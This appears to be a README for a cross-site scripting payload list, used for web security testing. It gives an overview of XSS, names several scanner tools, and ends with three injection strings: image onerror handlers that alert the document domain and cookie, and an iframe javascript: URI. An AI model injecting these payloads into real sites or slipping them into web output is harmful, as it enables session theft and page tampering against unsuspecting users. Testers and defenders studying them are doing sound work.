### 🚀 Cross Site Scripting ( XSS ) Vulnerability Payload List 🚀

##### Overview : 

Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted web sites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page. For more details on the different types of XSS flaws, see: [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).

#### XSS Vulneability Scanner Tool's :

* [XSStrike]

* [BruteXSS Terminal]

* [BruteXSS GUI]

* [XSS Scanner Online]

* [XSSer]

* [xsscrapy]

#### XSS Payload List :

```
<!-- Project Name  : Cross Site Scripting ( XSS ) Vulnerability Payload List -->
<!--        Author : Test -->
<!--      Linkedin : https://www.linkedin.com/in/test/ -->
<!--        GitHub : https://github.com/test/ -->
<!--       Twitter : https://twitter.com/test -->
<!--        Medium : https://medium.com/@test -->


<img src=1 href=1 onerror="javascript:alert(document.domain)"></img>
<image src=1 href=1 onerror="javascript:alert(document.cookie)"></image>

"><iframe src="JavaScript:alert(1)";>
